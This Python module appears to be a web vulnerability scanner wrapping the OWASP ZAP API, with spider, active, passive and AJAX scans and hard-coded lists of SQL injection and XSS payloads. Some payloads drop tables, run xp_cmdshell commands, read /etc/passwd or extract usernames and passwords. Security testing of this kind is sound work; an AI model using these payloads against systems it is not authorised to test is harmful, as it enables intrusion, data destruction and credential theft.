from zapv2 import ZAPv2
from config.settings import ZAP_HOST, ZAP_PORT, ZAP_API_KEY
import time

class ZAPScanner:
    sql_payloads = [
            "' OR 1=1--", "' UNION SELECT NULL--", "' AND 1=1--", 
            "' OR 'a'='a", "' UNION SELECT username, password FROM users--",
            "' OR 1=1#", "' OR '1'='1' --", "' AND 1=0 UNION SELECT NULL--",
            "' UNION SELECT @@version--", "' UNION SELECT database()--",
            "1' OR '1' = '1'; --", "' UNION SELECT table_name FROM information_schema.tables--",
            "'; DROP TABLE users; --", "' OR 1=1/*", "'--", 
            "'; EXEC xp_cmdshell('dir'); --", "' UNION SELECT 1,2,3--",
            "' UNION ALL SELECT NULL--", "' OR ''='", "' AND ''='",
            "' OR 1=1 LIMIT 1 --", "' OR EXISTS(SELECT * FROM users)--",
            "' AND password LIKE '%admin%'; --", "' UNION SELECT 1,2,LOAD_FILE('/etc/passwd')--",
            "' OR ASCII(SUBSTRING((SELECT @@version), 1, 1)) > 64--",
            "' OR BENCHMARK(1000000, MD5('test'))--", "' UNION SELECT 1,2,GROUP_CONCAT(username)--",
            "' UNION SELECT LOAD_FILE('/etc/passwd')--", "' OR 1=1;--",
            "' UNION SELECT password FROM users WHERE username='admin'--",
            "' OR EXISTS(SELECT * FROM admin)--"
        ]
    
    xss_payloads = [
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
            "<body onload=alert(1)>", "'><script>alert(1)</script>", "<iframe src='javascript:alert(1)'></iframe>",
            "<marquee onstart=alert(1)>", "<input onfocus=alert(1)>", "<video src=x onerror=alert(1)>",
            "<details open ontoggle=alert(1)>", "';alert(1)//", "'><img src=x onerror=alert(1)>",
            "<math href='javascript:alert(1)'></math>", "<button onclick=alert(1)>Click</button>",
            "<style>@keyframes x{}</style><div style=animation-name:x onanimationend=alert(1)>",
            "';document.cookie='x';</script>", "'';!--\"<XSS>=&{()}", "<a href='javascript:alert(1)'>XSS</a>",
            "<iframe src='javascript:alert(1)'></iframe>", "<img src='javascript:alert(1)'>",
            "<link rel='stylesheet' href='javascript:alert(1)'>", "<object data='javascript:alert(1)'></object>",
            "<embed src='javascript:alert(1)'>", "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
            "<svg><script>alert(1)</script></svg>", "<body><script>alert(1)</script></body>",
            "<img src='#' onerror='alert(1)'>", "<base href='javascript:alert(1)//'>", "<a href='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>XSS</a>",
            "<img src=x:alert(1);>"
        ]
    
    def __init__(self, target_url, scan_type):
        self.target_url = target_url
        self.scan_type = scan_type
        self.zap = ZAPv2(apikey=ZAP_API_KEY, proxies={"http": f"{ZAP_HOST}:{ZAP_PORT}"})
    
    def run_scan(self):
        print(f"Starting scan on {self.target_url} with scan type {self.scan_type}")

        if self.scan_type == 'spider':
            return self.run_spider_scan()
        elif self.scan_type == 'ascan':
            return self.run_active_scan()
        elif self.scan_type == 'pscan':
            return self.run_passive_scan()
        elif self.scan_type == 'sql_injection':
            return self.run_sql_injection_scan()
        elif self.scan_type == 'xss':
            return self.run_xss_scan()
        elif self.scan_type == 'ajaxSpider':
            return self.run_ajax_spider_scan()
        else:
            print(f"Scan type {self.scan_type} not recognized")
            return []

    def run_spider_scan(self):
        print(f"Starting Spider scan on {self.target_url}")
        self.zap.spider.scan(self.target_url)
        while int(self.zap.spider.status()) < 100:
            print(f"Spider scan progress: {self.zap.spider.status()}%")
            time.sleep(5)
        print("Spider scan completed.")
        return self.zap.core.alerts()

    def run_active_scan(self):
        print(f"Starting Active scan on {self.target_url}")
        self.zap.ascan.scan(self.target_url)
        while int(self.zap.ascan.status()) < 100:
            print(f"Active scan progress: {self.zap.ascan.status()}%")
            time.sleep(5)
        print("Active scan completed.")
        return self.zap.core.alerts()

    def run_passive_scan(self):
        print(f"Starting Passive scan on {self.target_url}")

        while int(self.zap.pscan.records_to_scan) > 0:
            print(f"Records remaining to passive scan: {self.zap.pscan.records_to_scan}")
            time.sleep(2) 
        
        print("Passive scan completed.")
        return self.zap.core.alerts()
    
    def run_ajax_spider_scan(self):
        print(f"Starting AJAX Spider scan on {self.target_url}")
        self.zap.ajaxSpider.scan(self.target_url)

        # Timeout to prevent indefinite blocking (2 minutes)
        timeout = time.time() + 60 * 2  
        while self.zap.ajaxSpider.status == 'running':
            if time.time() > timeout:
                print("AJAX Spider scan timed out!")
                break
            print(f"AJAX Spider status: {self.zap.ajaxSpider.status}")
            time.sleep(2)

        if self.zap.ajaxSpider.status == 'stopped':
            print("AJAX Spider scan completed.")
        return self.zap.core.alerts()

    def run_sql_injection_scan(self):
        self.add_sql_payloads()
        scan_results = self.run_active_scan()
        self.remove_sql_payloads()
        return scan_results

    def run_xss_scan(self):
        self.add_xss_payloads()
        scan_results = self.run_active_scan()
        self.remove_xss_payloads()
        return scan_results
        
    def add_sql_payloads(self):
        for payload in self.sql_payloads:
            self.zap.custompayloads.add_custom_payload('sql_injection', payload)
        print("Added SQL Injection payloads.")

    def remove_sql_payloads(self):
        for payload in self.sql_payloads:
            self.zap.custompayloads.remove_custom_payload('sql_injection', payload)
        print("Removed SQL Injection payloads.")

    def add_xss_payloads(self):
        for payload in self.xss_payloads:
            self.zap.custompayloads.add_custom_payload('xss', payload)
        print("Added XSS payloads.")

    def remove_xss_payloads(self):
        for payload in self.xss_payloads:
            self.zap.custompayloads.remove_custom_payload('xss', payload)
        print("Removed XSS payloads.")
        
